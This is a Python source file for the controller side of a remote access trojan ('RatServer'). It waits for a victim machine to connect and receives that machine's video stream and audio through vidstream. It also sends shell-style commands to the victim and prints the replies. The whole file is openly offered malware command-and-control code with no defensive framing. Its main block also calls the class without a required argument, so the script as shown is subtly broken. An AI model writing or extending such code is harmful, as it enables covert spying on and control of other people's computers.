import socket
import vidstream
import config
import threading

class RatServer:
    def __init__(self,host:str,port:int, msg_callback) -> None:
        """Host a server for the rat msg_callback is a function called whenever the server needs to output something"""
        self.HOST = host
        self.PORT = port
        self.calback = msg_callback
        self.isrunning = False

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection_addr = ()
        
        
        self.vid_server = vidstream.StreamingServer(self.HOST, config.STREAM_PORT)
        self.audio_server = vidstream.AudioReceiver(self.HOST, config.AUDIO_PORT)

        self.audio_server.start_server()
        self.vid_server.start_server()

    def start(self):
        """Waits for a connection and then accepts it"""
        try:
            self.output("[*] Attempting to listen for clients.")
            listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listen.bind((self.HOST,self.PORT))

            self.output("[*] Waiting for a connection on port " + str(self.PORT))
            listen.listen(1)

            self.connection, self.connection_addr = listen.accept()
            self.isrunning = True

            threading.Thread(target=self.recieve_client).start()

            self.output(f"[*] Accepted connection from {self.connection_addr[0]}")
            self.output("\n")
            

        except Exception as e:
            self.output(f"Failed to connect to a client: {str(e)}") 

    def recieve_client(self):
        """A seperate thread that recieves messages"""
        self.output("[*] Now reciving messages.")
        try:

            while self.isrunning:
                recieved = self.connection.recv(1024).decode()
                split_data = recieved.split("\n")

                print(f"Recived data: {recieved[:30]}")

                # Write muti-line shit
                for line in split_data:
                    self.output(line)
                self.output("\n")

        except Exception as error:
            self.output(F"[X] Stopped recieving messages. {error}")

    def output(self, message:str):
        """Outputs a message to the console"""
        self.calback(message)
        print(f"DEBUG OUTPUT: {message}")

    def send_command(self,message:str,encode=True):
        """Send a message to the connection, automatically encodes unless said not to"""
        try:
            if not self.isrunning:
                self.output("Message not sent, not running")
                return

            if message.strip().lower() == "exit":
                self.connection.send("exit".encode())
                self.stop()

            if encode:
                self.output(f"> {message}")
                self.connection.send(message.encode())
            else:
                self.output(f"> {message}")
                self.connection.send(message)
        except:
            pass

    def stop(self):
        self.output("Connection is closing")
        self.connection.close()
        self.vid_server.stop_server()
        self.isrunning = False


if __name__ == "__main__":

    def callback(*args, **_):
        print("".join(args))

    rs = RatServer(config.HOST, config.PORT)
    rs.start()